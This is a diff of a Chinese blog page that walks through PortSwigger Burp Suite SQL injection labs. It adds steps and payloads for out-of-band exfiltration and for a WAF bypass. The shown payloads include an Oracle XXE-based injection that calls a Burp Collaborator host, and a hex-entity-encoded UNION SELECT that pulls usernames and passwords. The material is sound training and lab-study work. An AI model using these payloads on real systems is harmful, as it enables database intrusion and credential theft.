@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211162236391.jpg">
 <meta property="article:published_time" content="2022-11-16T14:31:35.000Z">
-<meta property="article:modified_time" content="2023-03-08T09:04:49.005Z">
+<meta property="article:modified_time" content="2023-03-09T07:22:48.278Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="burpsuite靶场">
 <meta property="article:tag" content="sql注入">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.4k 字
+          7k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          54 分钟
+          59 分钟
         
       </span>
     
@@ -496,14 +496,37 @@
 
 <p>使用 burp collaborator client</p>
 <p>替换之后的payload为</p>
-<ol>
-<li><pre><code class="hljs">TrackingId=x&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//7y6mp6oqqpi26r9lyv2b8qogn7tyhn.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;&#39;),&#39;/l&#39;)+FROM+dual--
-</code></pre>
-</li>
-</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">TrackingId=x<span class="hljs-string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span>&lt;%<span class="hljs-number">3</span>fxml+version%<span class="hljs-number">3</span>d<span class="hljs-string">&quot;1.0&quot;</span>+encoding%<span class="hljs-number">3</span>d<span class="hljs-string">&quot;UTF-8&quot;</span>%<span class="hljs-number">3</span>f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%<span class="hljs-number">25</span>+remote+SYSTEM+<span class="hljs-string">&quot;http%3a//7y6mp6oqqpi26r9lyv2b8qogn7tyhn.burpcollaborator.net/&quot;</span>&gt;+%<span class="hljs-number">25</span>remote%<span class="hljs-number">3</span>b]&gt;<span class="hljs-string">&#x27;),&#x27;</span>/l<span class="hljs-string">&#x27;)+FROM+dual--</span><br></code></pre></td></tr></table></figure>
+
+
+
 <p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303081625120.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
 <p>实验即可完成</p>
 <h3 id="16-带外数据泄露的盲-SQL-注入"><a href="#16-带外数据泄露的盲-SQL-注入" class="headerlink" title="16.带外数据泄露的盲 SQL 注入"></a>16.带外数据泄露的盲 SQL 注入</h3><p>在上一题的基础上进行交互</p>
+<p>点击poll now进行交互 登陆得到的admin账号密码即可通关</p>
+<h3 id="17-通过-XML-编码使用过滤器旁路的-SQL-注入"><a href="#17-通过-XML-编码使用过滤器旁路的-SQL-注入" class="headerlink" title="17.通过 XML 编码使用过滤器旁路的 SQL 注入"></a>17.通过 XML 编码使用过滤器旁路的 SQL 注入</h3><p>点击进入商品页面</p>
+<p>点击<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091459528.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>抓包，发现有xml代码，而且可以用表达式控制 1+1 和 2 的返回结果是一样的因此可能存在注入</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091503002.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload alt="i"></p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091459990.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>接下来直接尝试注入</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091504799.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>发现有waf</p>
+<p>在提示里有绕waf的提示</p>
+<p><strong>绕过 WAF</strong></p>
+<ol>
+<li>在注入 XML 时，请尝试使用 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/xml-entities">XML 实体</a>对有效负载进行模糊处理。一种方法是使用 <a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">Hackvertor</a> 扩展。只需突出显示您的输入，右键单击，然后选择 <strong>Hackvertor &gt;扩展&gt;编码 &gt; dec_entities&#x2F;hex_entities</strong>。</li>
+<li>重新发送请求，并注意您现在收到来自应用程序的正常响应。这表明您已成功绕过 WAF。</li>
+</ol>
+<p>例1 进行base64编码：<br><code>&lt;@base64_0&gt;xz&lt;@/base64_0&gt;</code></p>
+<p>例2 进行多级编码(multiple levels of encoding)：<br><code>&lt;@base64_1&gt;&lt;@hex_0(&quot; &quot;)&gt;xz&lt;@/hex_0&gt;&lt;@/base64_1&gt;</code></p>
+<p>先安装Hackvertor</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091517908.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1">&lt;@hex_entities&gt;1 UNION SELECT username || &#x27;~&#x27; || password FROM users&lt;@/hex_entities&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091518418.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>得到密码登录即可</p>
 
                 
               </div>
